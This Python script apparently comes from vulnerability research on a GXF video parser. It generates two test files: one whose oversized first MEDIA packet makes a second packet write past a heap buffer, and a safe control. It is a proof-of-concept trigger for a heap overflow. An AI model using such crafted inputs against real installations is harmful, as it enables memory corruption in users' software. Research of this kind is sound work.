#!/usr/bin/env python3
"""W11: two MEDIA packets in one GXF, to measure whether data->len accumulates.

The pinned parse_mpeg_packet (ccx_gxf.c:943-944) writes at
data->buffer + data->len and then adds len; general_loop.c:790 resets len only
after a processing iteration. This generator puts an overflow-sized MEDIA
packet before a small MEDIA packet, so the second write (if reached) starts
3976 bytes past malloc(BUFSIZE). Local file generation only; no source edit.
"""
import struct
import sys
from pathlib import Path

from make_gxf import map_packet, media_packet


def main() -> None:
    out = Path(sys.argv[1])
    out.mkdir(parents=True, exist_ok=True)
    specs = {
        # first MEDIA: 0x201000 = BUFSIZE + 3976; second: 4096 bytes.
        "double-attack": (0x201000, 0x201000, b"MISHE-CCEX", 0x1000, 0x1000, b"W11-SECOND"),
        # control: both MEDIA packets are within BUFSIZE.
        "double-safe": (0x1000, 0x1000, b"MISHE-CCEX", 0x1000, 0x1000, b"W11-SECOND"),
    }
    for name, (s1, n1, seed1, s2, n2, seed2) in specs.items():
        data = map_packet() + media_packet(s1, n1, seed1) + media_packet(s2, n2, seed2)
        path = out / f"{name}.gxf"
        path.write_bytes(data)
        print(f"{path} size={len(data)} first={s1:#x} second={s2:#x}")


if __name__ == "__main__":
    main()
